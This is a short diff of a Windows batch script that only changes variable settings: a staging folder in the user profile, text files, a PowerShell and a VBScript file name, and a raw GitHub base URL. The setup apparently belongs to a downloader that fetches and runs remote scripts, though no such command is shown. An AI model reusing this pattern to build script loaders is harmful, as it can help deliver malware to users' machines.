@@ -1,12 +1,12 @@
 @echo off
 setlocal EnableDelayedExpansion
 
-set "d=%APPDATA%\Paged"
-set "f=%d%\M.txt"
-set "a=%d%\f1.txt"
-set "b=%d%\f2.txt"
-set "c=%d%\Nvs.ps1"
-set "v=%d%\S_m.vbs"
+set "d=%userprofile%\NewProfile"
+set "f=%d%\META.txt"
+set "a=%d%\1.txt"
+set "b=%d%\2.txt"
+set "c=%d%\NNV.ps1"
+set "v=%d%\S_M.vbs"
 set "u=raw.githubusercontent.com/chotaacc/newss/main/"
 set tynLink="****"
 
